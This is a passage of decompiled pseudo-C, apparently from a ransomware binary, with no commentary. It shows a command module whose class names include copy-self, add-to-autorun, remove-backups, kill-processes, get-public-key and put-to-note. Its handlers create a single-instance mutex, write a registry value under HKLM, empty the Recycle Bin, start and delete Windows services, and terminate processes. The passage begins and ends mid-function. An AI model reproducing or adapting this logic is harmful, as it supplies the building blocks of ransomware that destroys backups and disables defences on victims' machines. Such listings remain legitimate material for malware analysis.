  v2[10] = 0;
  return __RTDynamicCast((int)this, 0, &ANIEvent `RTTI Type Descriptor', &ANEventShareScan `RTTI Type Descriptor', 1);
}

//----- (0041A1E0) --------------------------------------------------------
int __thiscall sub_41A1E0(void *this)
{
  _DWORD v2[11]; // [esp+0h] [ebp-2Ch] BYREF

  v2[7] = v2;
  v2[10] = 0;
  return __RTDynamicCast(
           (int)this,
           0,
           &ANIEvent `RTTI Type Descriptor',
           &ANEventHiddenDevicesScan `RTTI Type Descriptor',
           1);
}

//----- (0041A260) --------------------------------------------------------
int __thiscall sub_41A260(void *this)
{
  _DWORD v2[11]; // [esp+0h] [ebp-2Ch] BYREF

  v2[7] = v2;
  v2[10] = 0;
  return __RTDynamicCast((int)this, 0, &ANIEvent `RTTI Type Descriptor', &ANEventSmartScan `RTTI Type Descriptor', 1);
}

//----- (0041A2E0) --------------------------------------------------------
void ***sub_41A2E0()
{
  return &std::_Binder<std::_Unforced,void (__thiscall ANResourceScannerModule::*)(ANIEvent &&),ANResourceScannerModule *,std::_Ph<1> const &> `RTTI Type Descriptor';
}
// 4FF168: using guessed type void **std::_Binder<std::_Unforced,void (__thiscall ANResourceScannerModule::*)(ANIEvent &&),ANResourceScannerModule *,std::_Ph<1> const &> `RTTI Type Descriptor';

//----- (0041A2F0) --------------------------------------------------------
int __thiscall sub_41A2F0(int this, int a2)
{
  int result; // eax

  result = a2;
  *(_DWORD *)a2 = &std::_Func_impl_no_alloc<std::_Binder<std::_Unforced,void (__thiscall ANResourceScannerModule::*)(ANIEvent &&),ANResourceScannerModule *,std::_Ph<1> const &>,void,ANIEvent &&>::`vftable';
  *(_DWORD *)(a2 + 4) = *(_DWORD *)(this + 4);
  *(_BYTE *)(a2 + 8) = *(_BYTE *)(this + 8);
  *(_DWORD *)(a2 + 12) = *(_DWORD *)(this + 12);
  return result;
}
// 4B171C: using guessed type void *std::_Func_impl_no_alloc<std::_Binder<std::_Unforced,void (__thiscall ANResourceScannerModule::*)(ANIEvent &&),ANResourceScannerModule *,std::_Ph<1> const &>,void,ANIEvent &&>::`vftable';

//----- (0041A320) --------------------------------------------------------
_DWORD *__thiscall sub_41A320(_DWORD *Block, char a2)
{
  *Block = &ANSystemModule::`vftable';
  sub_40F840(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}
// 4B1768: using guessed type void *ANSystemModule::`vftable';

//----- (0041A350) --------------------------------------------------------
int __thiscall sub_41A350(int *this)
{
  int result; // eax
  char v3; // [esp+Bh] [ebp-45h]
  int v4[2]; // [esp+Ch] [ebp-44h] BYREF
  int *v5; // [esp+14h] [ebp-3Ch]
  int v6[2]; // [esp+18h] [ebp-38h] BYREF
  char v7; // [esp+20h] [ebp-30h]
  int *v8; // [esp+24h] [ebp-2Ch]
  int *v9; // [esp+3Ch] [ebp-14h]
  int v10; // [esp+4Ch] [ebp-4h]

  v7 = v3;
  v6[0] = (int)&std::_Func_impl_no_alloc<std::_Binder<std::_Unforced,void (__thiscall ANSystemModule::*)(ANIEvent &&),ANSystemModule *,std::_Ph<1> const &>,void,ANIEvent &&>::`vftable';
  v6[1] = (int)sub_41A560;
  v8 = this;
  v9 = v6;
  v10 = 0;
  sub_40FA20(this, 0, (int)v6);
  v4[0] = (int)sub_41A5C0;
  v5 = this;
  sub_41A9A0(v6, (int)v4);
  sub_40FA20(this, 1, (int)v6);
  v4[0] = (int)sub_41A5E0;
  v5 = this;
  sub_41A9A0(v6, (int)v4);
  sub_40FA20(this, 7, (int)v6);
  v4[0] = (int)sub_41A610;
  v5 = this;
  sub_41A9A0(v6, (int)v4);
  sub_40FA20(this, 21, (int)v6);
  v4[0] = (int)sub_41A760;
  v5 = this;
  sub_41A9A0(v6, (int)v4);
  sub_40FA20(this, 22, (int)v6);
  v4[0] = (int)sub_41A7D0;
  v5 = this;
  sub_41A9A0(v6, (int)v4);
  sub_40FA20(this, 23, (int)v6);
  v4[0] = (int)sub_41A800;
  v5 = this;
  sub_41A9A0(v6, (int)v4);
  sub_40FA20(this, 24, (int)v6);
  v4[0] = (int)sub_41A830;
  v5 = this;
  sub_41A9A0(v6, (int)v4);
  sub_40FA20(this, 25, (int)v6);
  v4[0] = (int)sub_41A840;
  v5 = this;
  sub_41A9A0(v6, (int)v4);
  sub_40FA20(this, 27, (int)v6);
  v4[0] = (int)sub_41A8B0;
  v5 = this;
  sub_41A9A0(v6, (int)v4);
  sub_40FA20(this, 26, (int)v6);
  v4[0] = (int)sub_41A8F0;
  v5 = this;
  sub_41A9A0(v6, (int)v4);
  sub_40FA20(this, 28, (int)v6);
  v4[0] = (int)sub_41A970;
  v5 = this;
  sub_41A9A0(v6, (int)v4);
  result = sub_40FA20(this, 29, (int)v6);
  if ( v9 )
    return (*(int (__stdcall **)(bool))(*v9 + 16))(v9 != v6);
  return result;
}
// 41A37E: variable 'v3' is possibly undefined
// 4B174C: using guessed type void *std::_Func_impl_no_alloc<std::_Binder<std::_Unforced,void (__thiscall ANSystemModule::*)(ANIEvent &&),ANSystemModule *,std::_Ph<1> const &>,void,ANIEvent &&>::`vftable';

//----- (0041A560) --------------------------------------------------------
char __stdcall sub_41A560(void *a1)
{
  int v1; // eax
  int v2; // edi
  const WCHAR *v3; // esi
  const WCHAR *v4; // eax
  char result; // al

  v1 = sub_41AA00(a1);
  v2 = v1;
  v3 = (const WCHAR *)(v1 + 16);
  if ( !*(_DWORD *)(v1 + 32) )
    goto LABEL_8;
  v4 = (const WCHAR *)(v1 + 16);
  if ( *((_DWORD *)v3 + 5) >= 8u )
    v4 = *(const WCHAR **)v3;
  if ( OpenMutexW(0x1F0001u, 0, v4) )
  {
LABEL_8:
    result = 1;
    *(_BYTE *)(v2 + 40) = 1;
  }
  else
  {
    if ( *((_DWORD *)v3 + 5) >= 8u )
      v3 = *(const WCHAR **)v3;
    CreateMutexW(0, 0, v3);
    result = 0;
    *(_BYTE *)(v2 + 40) = 0;
  }
  return result;
}

//----- (0041A5C0) --------------------------------------------------------
char __thiscall sub_41A5C0(_DWORD *this, int a2)
{
  char result; // al

  result = sub_40EC80(this + 6);
  if ( !result )
  {
    sub_40EF90();
    _loaddll(0);
    JUMPOUT(0x41A5DB);
  }
  return result;
}
// 41A5D6: control flows out of bounds to 41A5DB

//----- (0041A5E0) --------------------------------------------------------
char __thiscall sub_41A5E0(_DWORD *this, void *a2)
{
  int v3; // esi
  char result; // al

  v3 = sub_41AA80(a2);
  result = sub_40EC80(this + 6);
  *(_BYTE *)(v3 + 16) = result;
  return result;
}

//----- (0041A610) --------------------------------------------------------
void __stdcall sub_41A610(int a1)
{
  int v1; // esi
  int v2; // eax
  void *v3; // ecx
  _BYTE *v4; // ecx
  void *v5; // [esp+8h] [ebp-44h] BYREF
  unsigned int v6; // [esp+1Ch] [ebp-30h]
  void *Block[5]; // [esp+20h] [ebp-2Ch] BYREF
  unsigned int v8; // [esp+34h] [ebp-18h]
  BYTE Data[4]; // [esp+38h] [ebp-14h] BYREF
  HKEY phkResult[4]; // [esp+3Ch] [ebp-10h] BYREF
  int savedregs; // [esp+4Ch] [ebp+0h] BYREF

  v1 = sub_40C780(&dword_4F8B78, (int)&v5, (int)&savedregs);
  phkResult[3] = 0;
  v2 = sub_40C780(&dword_4F8D40, (int)Block, (int)&savedregs);
  *(_DWORD *)Data = 1;
  phkResult[0] = HKEY_LOCAL_MACHINE;
  if ( *(_DWORD *)(v2 + 16) && *(_DWORD *)(v1 + 16) )
  {
    if ( *(_DWORD *)(v2 + 20) >= 8u )
      v2 = *(_DWORD *)v2;
    if ( !RegOpenKeyExW(HKEY_LOCAL_MACHINE, (LPCWSTR)v2, 0, 0xF003Fu, phkResult) )
    {
      if ( *(_DWORD *)(v1 + 20) >= 8u )
        v1 = *(_DWORD *)v1;
      RegSetValueExW(phkResult[0], (LPCWSTR)v1, 0, 4u, Data, 4u);
      RegCloseKey(phkResult[0]);
    }
  }
  if ( v8 >= 8 )
  {
    v3 = Block[0];
    if ( 2 * v8 + 2 >= 0x1000 )
    {
      v3 = (void *)*((_DWORD *)Block[0] - 1);
      if ( (unsigned int)(Block[0] - v3 - 4) > 0x1F )
        goto LABEL_18;
    }
    sub_44775B(v3);
  }
  Block[4] = 0;
  v8 = 7;
  LOWORD(Block[0]) = 0;
  if ( v6 < 8 )
    return;
  v4 = v5;
  if ( 2 * v6 + 2 >= 0x1000 )
  {
    v4 = (_BYTE *)*((_DWORD *)v5 - 1);
    if ( (unsigned int)((_BYTE *)v5 - v4 - 4) > 0x1F )
LABEL_18:
      _invalid_parameter_noinfo_noreturn();
  }
  sub_44775B(v4);
}

//----- (0041A760) --------------------------------------------------------
void __stdcall sub_41A760(void *a1)
{
  _DWORD *v1; // esi
  _QWORD *stats; // eax
  _BYTE *v3; // ecx
  void *Block; // [esp+8h] [ebp-18h] BYREF
  unsigned int v5; // [esp+1Ch] [ebp-4h]

  v1 = (_DWORD *)(sub_41AB00(a1) + 16);
  stats = (_QWORD *)__std_fs_get_stats(&Block, v1);
  sub_405520(v1, stats);
  if ( v5 >= 8 )
  {
    v3 = Block;
    if ( 2 * v5 + 2 >= 0x1000 )
    {
      v3 = (_BYTE *)*((_DWORD *)Block - 1);
      if ( (unsigned int)((_BYTE *)Block - v3 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v3);
  }
}
// 40CB20: using guessed type _DWORD __stdcall __std_fs_get_stats(_DWORD, _DWORD);

//----- (0041A7D0) --------------------------------------------------------
int __stdcall sub_41A7D0(void *a1)
{
  int v1; // eax

  v1 = sub_41AB80(a1);
  return sub_40CF50((LPCWSTR)(v1 + 16), (BYTE *)(v1 + 40), *(_DWORD *)(v1 + 64));
}

//----- (0041A800) --------------------------------------------------------
HRESULT __stdcall sub_41A800(void *a1)
{
  int v1; // eax

  v1 = sub_41AC00(a1);
  sub_40D0F0(*(_DWORD *)(v1 + 16));
  return SHEmptyRecycleBinW(0, 0, 7u);
}

//----- (0041A830) --------------------------------------------------------
void __thiscall sub_41A830(_DWORD *this, int a2)
{
  sub_40ED20(this + 6, a2);
}

//----- (0041A840) --------------------------------------------------------
SC_HANDLE __stdcall sub_41A840(void *a1)
{
  SC_HANDLE result; // eax
  int v2; // esi
  int i; // ebx
  SC_HANDLE v4; // edi
  const WCHAR *v5; // eax
  SC_HANDLE v6; // eax

  result = (SC_HANDLE)sub_41AC80(a1);
  v2 = *((_DWORD *)result + 4);
  for ( i = *((_DWORD *)result + 5); v2 != i; v2 += 24 )
  {
    if ( *(_DWORD *)(v2 + 16) )
    {
      result = OpenSCManagerW(0, 0, 0xF003Fu);
      v4 = result;
      if ( result )
      {
        v5 = (const WCHAR *)v2;
        if ( *(_DWORD *)(v2 + 20) >= 8u )
          v5 = *(const WCHAR **)v2;
        v6 = OpenServiceW(v4, v5, 0x10u);
        if ( v6 )
          StartServiceW(v6, 0, 0);
        result = (SC_HANDLE)CloseServiceHandle(v4);
      }
    }
  }
  return result;
}

//----- (0041A8B0) --------------------------------------------------------
char __stdcall sub_41A8B0(void *a1)
{
  int v1; // eax
  int v2; // edi
  const WCHAR *v3; // esi
  const WCHAR *i; // ebx

  v1 = sub_41AD00(a1);
  v2 = v1;
  v3 = *(const WCHAR **)(v1 + 16);
  for ( i = *(const WCHAR **)(v1 + 20); v3 != i; v3 += 12 )
    LOBYTE(v1) = sub_40D300(v3, *(_DWORD *)(v2 + 28));
  return v1;
}

//----- (0041A8F0) --------------------------------------------------------
int __stdcall sub_41A8F0(void *a1)
{
  int v1; // eax
  int v2; // esi
  int result; // eax
  SC_HANDLE v4; // edi
  const WCHAR *v5; // eax
  SC_HANDLE v6; // eax
  SC_HANDLE v7; // ebx
  int i; // [esp+Ch] [ebp+8h]

  v1 = sub_41AD80(a1);
  v2 = *(_DWORD *)(v1 + 16);
  result = *(_DWORD *)(v1 + 20);
  for ( i = result; v2 != result; v2 += 24 )
  {
    if ( *(_DWORD *)(v2 + 16) )
    {
      v4 = OpenSCManagerW(0, 0, 0xF003Fu);
      if ( v4 )
      {
        v5 = (const WCHAR *)v2;
        if ( *(_DWORD *)(v2 + 20) >= 8u )
          v5 = *(const WCHAR **)v2;
        v6 = OpenServiceW(v4, v5, 0x10020u);
        v7 = v6;
        if ( v6 )
        {
          DeleteService(v6);
          CloseServiceHandle(v7);
        }
        CloseServiceHandle(v4);
      }
      result = i;
    }
  }
  return result;
}

//----- (0041A970) --------------------------------------------------------
char __stdcall sub_41A970(void *a1)
{
  int v1; // eax
  _DWORD *v2; // esi
  _DWORD *i; // edi

  v1 = sub_41AE00(a1);
  v2 = *(_DWORD **)(v1 + 16);
  for ( i = *(_DWORD **)(v1 + 20); v2 != i; v2 += 6 )
    LOBYTE(v1) = sub_40C990(v2);
  return v1;
}

//----- (0041A9A0) --------------------------------------------------------
void *__thiscall sub_41A9A0(void *this, int a2)
{
  int v4[2]; // [esp+8h] [ebp-28h] BYREF
  char v5; // [esp+10h] [ebp-20h]
  int v6; // [esp+14h] [ebp-1Ch]
  int *v7; // [esp+2Ch] [ebp-4h]

  v4[0] = (int)&std::_Func_impl_no_alloc<std::_Binder<std::_Unforced,void (__thiscall ANSystemModule::*)(ANIEvent &&),ANSystemModule *,std::_Ph<1> const &>,void,ANIEvent &&>::`vftable';
  v4[1] = *(_DWORD *)a2;
  v5 = *(_BYTE *)(a2 + 4);
  v6 = *(_DWORD *)(a2 + 8);
  v7 = v4;
  sub_412DF0(v4, (int)this);
  if ( v7 )
    (*(void (__stdcall **)(bool))(*v7 + 16))(v7 != v4);
  return this;
}
// 4B174C: using guessed type void *std::_Func_impl_no_alloc<std::_Binder<std::_Unforced,void (__thiscall ANSystemModule::*)(ANIEvent &&),ANSystemModule *,std::_Ph<1> const &>,void,ANIEvent &&>::`vftable';

//----- (0041AA00) --------------------------------------------------------
int __thiscall sub_41AA00(void *this)
{
  _DWORD v2[11]; // [esp+0h] [ebp-2Ch] BYREF

  v2[7] = v2;
  v2[10] = 0;
  return __RTDynamicCast((int)this, 0, &ANIEvent `RTTI Type Descriptor', &ANEventIsRunning `RTTI Type Descriptor', 1);
}

//----- (0041AA80) --------------------------------------------------------
int __thiscall sub_41AA80(void *this)
{
  _DWORD v2[11]; // [esp+0h] [ebp-2Ch] BYREF

  v2[7] = v2;
  v2[10] = 0;
  return __RTDynamicCast((int)this, 0, &ANIEvent `RTTI Type Descriptor', &ANEventIsAdmin `RTTI Type Descriptor', 1);
}

//----- (0041AB00) --------------------------------------------------------
int __thiscall sub_41AB00(void *this)
{
  _DWORD v2[11]; // [esp+0h] [ebp-2Ch] BYREF

  v2[7] = v2;
  v2[10] = 0;
  return __RTDynamicCast((int)this, 0, &ANIEvent `RTTI Type Descriptor', &ANEventCopySelf `RTTI Type Descriptor', 1);
}

//----- (0041AB80) --------------------------------------------------------
int __thiscall sub_41AB80(void *this)
{
  _DWORD v2[11]; // [esp+0h] [ebp-2Ch] BYREF

  v2[7] = v2;
  v2[10] = 0;
  return __RTDynamicCast((int)this, 0, &ANIEvent `RTTI Type Descriptor', &ANEventAddToAutorun `RTTI Type Descriptor', 1);
}

//----- (0041AC00) --------------------------------------------------------
int __thiscall sub_41AC00(void *this)
{
  _DWORD v2[11]; // [esp+0h] [ebp-2Ch] BYREF

  v2[7] = v2;
  v2[10] = 0;
  return __RTDynamicCast(
           (int)this,
           0,
           &ANIEvent `RTTI Type Descriptor',
           &ANEventRemoveBackups `RTTI Type Descriptor',
           1);
}

//----- (0041AC80) --------------------------------------------------------
int __thiscall sub_41AC80(void *this)
{
  _DWORD v2[11]; // [esp+0h] [ebp-2Ch] BYREF

  v2[7] = v2;
  v2[10] = 0;
  return __RTDynamicCast((int)this, 0, &ANIEvent `RTTI Type Descriptor', &ANEventRunServices `RTTI Type Descriptor', 1);
}

//----- (0041AD00) --------------------------------------------------------
int __thiscall sub_41AD00(void *this)
{
  _DWORD v2[11]; // [esp+0h] [ebp-2Ch] BYREF

  v2[7] = v2;
  v2[10] = 0;
  return __RTDynamicCast((int)this, 0, &ANIEvent `RTTI Type Descriptor', &ANEventStopServices `RTTI Type Descriptor', 1);
}

//----- (0041AD80) --------------------------------------------------------
int __thiscall sub_41AD80(void *this)
{
  _DWORD v2[11]; // [esp+0h] [ebp-2Ch] BYREF

  v2[7] = v2;
  v2[10] = 0;
  return __RTDynamicCast(
           (int)this,
           0,
           &ANIEvent `RTTI Type Descriptor',
           &ANEventRemoveServices `RTTI Type Descriptor',
           1);
}

//----- (0041AE00) --------------------------------------------------------
int __thiscall sub_41AE00(void *this)
{
  _DWORD v2[11]; // [esp+0h] [ebp-2Ch] BYREF

  v2[7] = v2;
  v2[10] = 0;
  return __RTDynamicCast(
           (int)this,
           0,
           &ANIEvent `RTTI Type Descriptor',
           &ANEventKillProcesses `RTTI Type Descriptor',
           1);
}

//----- (0041AE80) --------------------------------------------------------
void ***sub_41AE80()
{
  return &std::_Binder<std::_Unforced,void (__thiscall ANSystemModule::*)(ANIEvent &&),ANSystemModule *,std::_Ph<1> const &> `RTTI Type Descriptor';
}
// 4FF348: using guessed type void **std::_Binder<std::_Unforced,void (__thiscall ANSystemModule::*)(ANIEvent &&),ANSystemModule *,std::_Ph<1> const &> `RTTI Type Descriptor';

//----- (0041AE90) --------------------------------------------------------
int __thiscall sub_41AE90(int this, int a2)
{
  int result; // eax

  result = a2;
  *(_DWORD *)a2 = &std::_Func_impl_no_alloc<std::_Binder<std::_Unforced,void (__thiscall ANSystemModule::*)(ANIEvent &&),ANSystemModule *,std::_Ph<1> const &>,void,ANIEvent &&>::`vftable';
  *(_DWORD *)(a2 + 4) = *(_DWORD *)(this + 4);
  *(_BYTE *)(a2 + 8) = *(_BYTE *)(this + 8);
  *(_DWORD *)(a2 + 12) = *(_DWORD *)(this + 12);
  return result;
}
// 4B174C: using guessed type void *std::_Func_impl_no_alloc<std::_Binder<std::_Unforced,void (__thiscall ANSystemModule::*)(ANIEvent &&),ANSystemModule *,std::_Ph<1> const &>,void,ANIEvent &&>::`vftable';

//----- (0041AEC0) --------------------------------------------------------
void *sub_41AEC0()
{
  return &unk_5009D8;
}

//----- (0041AED0) --------------------------------------------------------
int __fastcall sub_41AED0(int a1, int a2, int a3, int a4)
{
  int *v4; // eax

  v4 = (int *)sub_41AEC0();
  return sub_4657A7(*v4, v4[1], a1, a2, 0, a4);
}

//----- (0041AF00) --------------------------------------------------------
int sub_41AF00(int a1, int a2, ...)
{
  va_list va; // [esp+10h] [ebp+10h] BYREF

  va_start(va, a2);
  return sub_41AED0(a1, a2, a1, (int)va);
}

//----- (0041AF20) --------------------------------------------------------
int __fastcall sub_41AF20(int *a1, int a2, int a3, int a4, int a5)
{
  _DWORD *v5; // eax
  int result; // eax

  v5 = sub_41AEC0();
  result = sub_465851(*v5 | 1, v5[1], a1, a2, a3, 0, a5);
  if ( result < 0 )
    return -1;
  return result;
}

//----- (0041AF60) --------------------------------------------------------
int __fastcall sub_41AF60(int *a1, int a2, int a3, int a4, int a5, int a6)
{
  int *v6; // eax
  int result; // eax

  v6 = (int *)sub_41AEC0();
  result = sub_46582A(*v6, v6[1], a1, a2, -1, a4, 0, a6);
  if ( result < 0 )
    return -1;
  return result;
}

//----- (0041AF90) --------------------------------------------------------
int __cdecl sub_41AF90(int a1)
{
  int v1; // ecx
  _DWORD *v2; // eax
  int result; // eax
  int v4; // [esp-Ch] [ebp-Ch]

  v4 = v1;
  v2 = sub_41AEC0();
  result = sub_465851(*v2 | 2, v2[1], 0, 0, v4, 0, a1);
  if ( result < 0 )
    return -1;
  return result;
}
// 41AF9B: variable 'v1' is possibly undefined

//----- (0041AFD0) --------------------------------------------------------
int __fastcall sub_41AFD0(int a1, _DWORD *a2)
{
  _DWORD *v2; // edi
  unsigned int v3; // eax
  unsigned int i; // esi
  _DWORD *v5; // eax
  unsigned __int8 v6; // di
  int v7; // ecx
  char v8; // dl
  __int128 *p_Src; // eax
  int v10; // ecx
  char v11; // dl
  __int128 *v12; // eax
  int result; // eax
  __int128 v14; // xmm0
  unsigned int v16; // [esp+10h] [ebp-38h]
  __int128 Src; // [esp+1Ch] [ebp-2Ch] BYREF
  __int64 v19; // [esp+2Ch] [ebp-1Ch]
  char v20[4]; // [esp+34h] [ebp-14h]
  int v21; // [esp+44h] [ebp-4h]

  v2 = a2;
  *(_DWORD *)v20 = a1;
  v3 = a2[4];
  *(_DWORD *)v20 = a1;
  v16 = v3;
  v19 = 0xF00000000i64;
  LOBYTE(Src) = 0;
  v21 = 0;
  sub_414300((void **)&Src, 2 * v3);
  for ( i = 0; i < v16; ++i )
  {
    v5 = v2;
    if ( v2[5] >= 0x10u )
      v5 = (_DWORD *)*v2;
    v6 = *((_BYTE *)v5 + i);
    v7 = v19;
    v8 = byte_4B1A28[v6 >> 4];
    if ( (unsigned int)v19 >= HIDWORD(v19) )
    {
      sub_40D800((void **)&Src, 1u, a1, byte_4B1A28[*((unsigned __int8 *)v5 + i) >> 4]);
    }
    else
    {
      LODWORD(v19) = v19 + 1;
      p_Src = &Src;
      if ( HIDWORD(v19) >= 0x10 )
        p_Src = (__int128 *)Src;
      *((_BYTE *)p_Src + v7) = v8;
      *((_BYTE *)p_Src + v7 + 1) = 0;
    }
    v10 = v19;
    v11 = byte_4B1A28[v6 & 0xF];
    v20[0] = v11;
    if ( (unsigned int)v19 >= HIDWORD(v19) )
    {
      sub_40D800((void **)&Src, 1u, a1, v20[0]);
    }
    else
    {
      LODWORD(v19) = v19 + 1;
      v12 = &Src;
      if ( HIDWORD(v19) >= 0x10 )
        v12 = (__int128 *)Src;
      *((_BYTE *)v12 + v10) = v11;
      *((_BYTE *)v12 + v10 + 1) = 0;
    }
    v2 = a2;
  }
  result = a1;
  v14 = Src;
  *(_DWORD *)(a1 + 16) = 0;
  *(_DWORD *)(a1 + 20) = 0;
  *(_OWORD *)a1 = v14;
  *(_QWORD *)(a1 + 16) = v19;
  return result;
}

//----- (0041B120) --------------------------------------------------------
int __thiscall sub_41B120(_DWORD *this)
{
  unsigned int v2; // ecx
  _DWORD *v3; // eax
  int result; // eax

  *this = &ANEventIsRunning::`vftable';
  v2 = this[9];
  if ( v2 >= 8 )
  {
    v3 = (_DWORD *)this[4];
    if ( 2 * v2 + 2 >= 0x1000 )
    {
      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v3 = (_DWORD *)*(v3 - 1);
    }
    sub_44775B(v3);
  }
  result = 0;
  this[8] = 0;
  this[9] = 7;
  *((_WORD *)this + 8) = 0;
  *this = &ANIEvent::`vftable';
  return result;
}
// 4B15AC: using guessed type void *ANIEvent::`vftable';
// 4B19E0: using guessed type void *ANEventIsRunning::`vftable';

//----- (0041B190) --------------------------------------------------------
_DWORD *__thiscall sub_41B190(_DWORD *Block, char a2)
{
  sub_41B120(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}

//----- (0041B1C0) --------------------------------------------------------
void __thiscall sub_41B1C0(_DWORD *this)
{
  int v2; // ecx
  _DWORD *v3; // edi

  *this = &ANEventDriveScan::`vftable';
  v2 = this[4];
  if ( v2 )
  {
    sub_4047B0(v2, this[5]);
    v3 = (_DWORD *)this[4];
    if ( (unsigned int)(24 * ((this[6] - (int)v3) / 24)) >= 0x1000 )
    {
      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v3 = (_DWORD *)*(v3 - 1);
    }
    sub_44775B(v3);
    this[4] = 0;
    this[5] = 0;
    this[6] = 0;
  }
  *this = &ANIEvent::`vftable';
}
// 4B15AC: using guessed type void *ANIEvent::`vftable';
// 4B1924: using guessed type void *ANEventDriveScan::`vftable';

//----- (0041B250) --------------------------------------------------------
_DWORD *__thiscall sub_41B250(_DWORD *Block, char a2)
{
  sub_41B1C0(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}

//----- (0041B280) --------------------------------------------------------
void __thiscall sub_41B280(_DWORD *this)
{
  int v2; // ecx
  _DWORD *v3; // edi

  *this = &ANEventShareScan::`vftable';
  v2 = this[4];
  if ( v2 )
  {
    sub_4047B0(v2, this[5]);
    v3 = (_DWORD *)this[4];
    if ( (unsigned int)(24 * ((this[6] - (int)v3) / 24)) >= 0x1000 )
    {
      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v3 = (_DWORD *)*(v3 - 1);
    }
    sub_44775B(v3);
    this[4] = 0;
    this[5] = 0;
    this[6] = 0;
  }
  *this = &ANIEvent::`vftable';
}
// 4B15AC: using guessed type void *ANIEvent::`vftable';
// 4B17A0: using guessed type void *ANEventShareScan::`vftable';

//----- (0041B310) --------------------------------------------------------
_DWORD *__thiscall sub_41B310(_DWORD *Block, char a2)
{
  sub_41B280(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}

//----- (0041B340) --------------------------------------------------------
void __thiscall sub_41B340(_DWORD *this)
{
  unsigned int v2; // ecx
  _DWORD *v3; // eax

  *this = &ANEventGetID::`vftable';
  v2 = this[9];
  if ( v2 >= 0x10 )
  {
    v3 = (_DWORD *)this[4];
    if ( v2 + 1 >= 0x1000 )
    {
      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v3 = (_DWORD *)*(v3 - 1);
    }
    sub_44775B(v3);
  }
  this[8] = 0;
  this[9] = 15;
  *((_BYTE *)this + 16) = 0;
  *this = &ANIEvent::`vftable';
}
// 4B15AC: using guessed type void *ANIEvent::`vftable';
// 4B18F4: using guessed type void *ANEventGetID::`vftable';

//----- (0041B3A0) --------------------------------------------------------
_DWORD *__thiscall sub_41B3A0(_DWORD *Block, char a2)
{
  sub_41B340(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}

//----- (0041B3D0) --------------------------------------------------------
void __thiscall sub_41B3D0(_DWORD *this)
{
  unsigned int v2; // ecx
  _DWORD *v3; // eax
  unsigned int v4; // ecx
  void *v5; // eax

  *this = &ANEventPutToNote::`vftable';
  v2 = this[15];
  if ( v2 >= 0x10 )
  {
    v3 = (_DWORD *)this[10];
    if ( v2 + 1 >= 0x1000 )
    {
      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )
        goto LABEL_12;
      v3 = (_DWORD *)*(v3 - 1);
    }
    sub_44775B(v3);
  }
  this[14] = 0;
  this[15] = 15;
  *((_BYTE *)this + 40) = 0;
  v4 = this[9];
  if ( v4 >= 0x10 )
  {
    v5 = (void *)this[4];
    if ( v4 + 1 < 0x1000 )
    {
LABEL_10:
      sub_44775B(v5);
      goto LABEL_11;
    }
    if ( (unsigned int)v5 - *((_DWORD *)v5 - 1) - 4 <= 0x1F )
    {
      v5 = (void *)*((_DWORD *)v5 - 1);
      goto LABEL_10;
    }
LABEL_12:
    _invalid_parameter_noinfo_noreturn();
  }
LABEL_11:
  this[8] = 0;
  this[9] = 15;
  *((_BYTE *)this + 16) = 0;
  *this = &ANIEvent::`vftable';
}
// 4B15AC: using guessed type void *ANIEvent::`vftable';
// 4B18FC: using guessed type void *ANEventPutToNote::`vftable';

//----- (0041B470) --------------------------------------------------------
_DWORD *__thiscall sub_41B470(_DWORD *Block, char a2)
{
  sub_41B3D0(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}

//----- (0041B4A0) --------------------------------------------------------
void __thiscall sub_41B4A0(_DWORD *this)
{
  unsigned int v2; // ecx
  _DWORD *v3; // eax

  *this = &ANEventGetPublicKey::`vftable';
  v2 = this[9];
  if ( v2 >= 0x10 )
  {
    v3 = (_DWORD *)this[4];
    if ( v2 + 1 >= 0x1000 )
    {
      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v3 = (_DWORD *)*(v3 - 1);
    }
    sub_44775B(v3);
  }
  this[8] = 0;
  this[9] = 15;
  *((_BYTE *)this + 16) = 0;
  *this = &ANIEvent::`vftable';
}
// 4B15AC: using guessed type void *ANIEvent::`vftable';
// 4B17B0: using guessed type void *ANEventGetPublicKey::`vftable';

//----- (0041B500) --------------------------------------------------------
_DWORD *__thiscall sub_41B500(_DWORD *Block, char a2)
{
  sub_41B4A0(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}

//----- (0041B530) --------------------------------------------------------
void __thiscall sub_41B530(_DWORD *this)
{
  int v2; // ecx
  _DWORD *v3; // edi

  *this = &ANEventGetServices::`vftable';
  v2 = this[4];
  if ( v2 )
  {
    sub_4047B0(v2, this[5]);
    v3 = (_DWORD *)this[4];
    if ( (unsigned int)(24 * ((this[6] - (int)v3) / 24)) >= 0x1000 )
    {
      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v3 = (_DWORD *)*(v3 - 1);
    }
    sub_44775B(v3);
    this[4] = 0;
    this[5] = 0;
    this[6] = 0;
  }
  *this = &ANIEvent::`vftable';
}
// 4B15AC: using guessed type void *ANIEvent::`vftable';
// 4B193C: using guessed type void *ANEventGetServices::`vftable';

//----- (0041B5C0) --------------------------------------------------------
_DWORD *__thiscall sub_41B5C0(_DWORD *Block, char a2)
{
  sub_41B530(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}

//----- (0041B5F0) --------------------------------------------------------
void __thiscall sub_41B5F0(_DWORD *this)
{
  int v2; // ecx
  _DWORD *v3; // edi

  *this = &ANEventGetProcesses::`vftable';
  v2 = this[4];
  if ( v2 )
  {
    sub_4047B0(v2, this[5]);
    v3 = (_DWORD *)this[4];
